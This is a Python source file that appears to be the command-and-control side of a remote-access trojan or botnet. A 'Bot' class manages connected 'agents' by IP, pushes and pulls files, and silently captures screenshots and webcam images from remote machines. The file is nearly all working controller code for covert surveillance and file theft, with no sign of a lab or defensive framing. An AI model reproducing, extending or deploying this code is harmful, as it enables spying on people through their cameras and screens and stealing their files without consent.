import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading
import logging
from datetime import datetime

# Constants
SCREENSHOT_DIR = 'images/screenshots'
WEBCAM_DIR = './images/webcam'
IMAGE_CHUNK_SIZE = 10485760 #10MB
SCREENSHOT_TIMEOUT = 10 # seconds
WEBCAM_TIMEOUT = 10 # seconds
ENCODING = 'utf-8'

class Bot:
    botList = {}
    botCount = 0
    
    def __init__(self, target, ip):
        self.target = target
        self.ip = ip
        self.alias = f"Agent_{Bot.botCount}"
        self.id = Bot.botCount
        self.connected_time = datetime.now()
        self.os_type = "Unknown"
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.is_admin = False
        self.last_seen = datetime.now()
        Bot.botList[self.id] = self
        Bot.botCount += 1
        logging.info(f"Bot initialized - ID: {self.id} | IP: {self.ip} | Connected at: {self.connected_time}")

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            length = len(json_data)
            length_header = f"{length:<10}".encode()  # Fixed length header
            self.target.send(length_header)
            self.target.send(json_data.encode())
            return True
        except Exception as e:
            logging.error(f"Error sending data to Session {self.id}: {e}")
            return False

    def reliable_recv(self):
        try:
            # First receive the length header
            length_header = self.target.recv(10).decode().strip()
            if not length_header:
                return None
            
            # Convert length header to int
            length = int(length_header)
            
            # Receive the actual data
            chunks = []
            bytes_received = 0
            while bytes_received < length:
                chunk = self.target.recv(min(length - bytes_received, 4096))
                if not chunk:
                    return None
                chunks.append(chunk)
                bytes_received += len(chunk)
            
            data = b''.join(chunks).decode()
            
            try:
                return json.loads(data)
            except json.JSONDecodeError:
                return data.strip()
            
        except Exception as e:
            logging.error(f"Error receiving data from Session {self.id}: {e}")
            return None

    def upload_file(self, file_data, filename):
        """Upload a file to the agent. 
        Args:
            file_data (bytes): The binary content of the file
            filename (str): The name of the file (basename only)
        Returns:
            tuple: (success, message)
        """
        try:
            # Send command and file info
            command = {
                'command': 'upload',
                'filename': os.path.basename(filename),  # Ensure we only use basename
                'size': len(file_data)
            }
            if not self.reliable_send(command):
                return False, "Failed to send upload command"

            # Wait for ready confirmation
            response = self.reliable_recv()
            if not response or not response.get('ready'):
                return False, "Agent not ready to receive file"

            # Send file data
            try:
                self.target.sendall(file_data)
                logging.info(f"File data sent - Session {self.id} | File: {filename}")
            except Exception as e:
                logging.error(f"Error sending file data - Session {self.id} | Error: {e}")
                return False, f"Error sending file data: {str(e)}"

            # Get upload confirmation
            response = self.reliable_recv()
            if response and response.get('success'):
                logging.info(f"File upload completed - Session {self.id} | File: {filename}")
                return True, f"File {filename} uploaded successfully"
            else:
                error = response.get('error', 'Upload failed') if response else 'No confirmation received'
                logging.error(f"Upload failed - Session {self.id} | Error: {error}")
                return False, error

        except Exception as e:
            logging.error(f"Upload error - Session {self.id} | Error: {e}")
            return False, f"Upload error: {str(e)}"

    def download_file(self, filename):
        """Download a file from the agent.
        Args:
            filename (str): The name of the file to download
        Returns:
            tuple: (success, message, file_data)
                success (bool): Whether the download was successful
                message (str): Status message or error message
                file_data (bytes or None): The file data if successful, None otherwise
        """
        try:
            # Send download command
            command = {
                'command': 'download',
                'filename': filename
            }
            if not self.reliable_send(command):
                return False, "Failed to send download command", None

            # Get file size response
            response = self.reliable_recv()
            if not response:
                return False, "No response from agent", None
            
            if response.get('error'):
                return False, response['error'], None
            
            try:
                file_size = int(response.get('size', 0))
                if file_size == 0:
                    return False, "Empty file size received", None
            except (ValueError, TypeError):
                return False, "Invalid file size received", None

            # Receive file data
            received_data = b''
            remaining = file_size
            
            try:
                while remaining > 0:
                    chunk = self.target.recv(min(4096, remaining))
                    if not chunk:
                        break
                    received_data += chunk
                    remaining -= len(chunk)
                
                if len(received_data) == file_size:
                    logging.info(f"File download completed - Session {self.id} | File: {filename}")
                    return True, f"File {filename} downloaded successfully", received_data
                else:
                    logging.error(f"Download incomplete - Session {self.id} | File: {filename}")
                    return False, "Download incomplete", None
                
            except Exception as e:
                logging.error(f"Error receiving file data - Session {self.id} | Error: {e}")
                return False, f"Error receiving file data: {str(e)}", None
            
        except Exception as e:
            logging.error(f"Download error - Session {self.id} | Error: {e}")
            return False, f"Download error: {str(e)}", None

    def screenshot(self):
        """Take a screenshot from the agent.
        Returns:
            tuple: (success, message, file_path)
        """
        try:
            # Create screenshots directory if it doesn't exist
            os.makedirs(SCREENSHOT_DIR, exist_ok=True)
            
            # Send screenshot command
            if not self.reliable_send('screenshot'):
                return False, "Failed to send screenshot command", None
            
            # Get response with file size
            response = self.reliable_recv()
            if not response or response.get('error'):
                error = response.get('error', 'No response from agent') if response else 'No response from agent'
                return False, error, None
            
            try:
                file_size = response.get('size', 0)
                if not file_size:
                    return False, "Invalid file size received", None
                
                # Generate unique filename
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f'screenshot_{self.id}_{timestamp}.png'
                filepath = os.path.join(SCREENSHOT_DIR, filename)
                
                # Receive and save screenshot data
                received = 0
                with open(filepath, 'wb') as f:
                    while received < file_size:
                        chunk = self.target.recv(min(4096, file_size - received))
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                    
                if received == file_size:
                    logging.info(f"Screenshot saved - Session {self.id} | File: {filepath}")
                    return True, "Screenshot saved successfully", filepath
                else:
                    os.remove(filepath)  # Clean up incomplete file
                    return False, "Screenshot transfer incomplete", None
                
            except Exception as e:
                logging.error(f"Error receiving screenshot - Session {self.id} | Error: {e}")
                return False, f"Error receiving screenshot: {str(e)}", None
            
        except Exception as e:
            logging.error(f"Screenshot error - Session {self.id} | Error: {e}")
            return False, f"Screenshot error: {str(e)}", None

    def webcam(self):
        os.makedirs(WEBCAM_DIR, exist_ok=True)
        count = len(os.listdir(WEBCAM_DIR))
        file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
        
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(WEBCAM_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"Webcam image saved to {file_name}"

    def kill(self):
        try:
            self.reliable_send('quit')
            self.target.close()
            duration = datetime.now() - self.connected_time
            logging.info(f"Session {self.id} terminated - Duration: {duration}")
            del Bot.botList[self.id]
            return f"Session terminated successfully - Duration: {duration}"
        except Exception as e:
            logging.error(f"Error terminating Session {self.id}: {e}")
            return f"Error terminating session: {e}" 

    def update_last_seen(self):
        self.last_seen = datetime.now()
        logging.debug(f"Updated last seen for Session {self.id}") 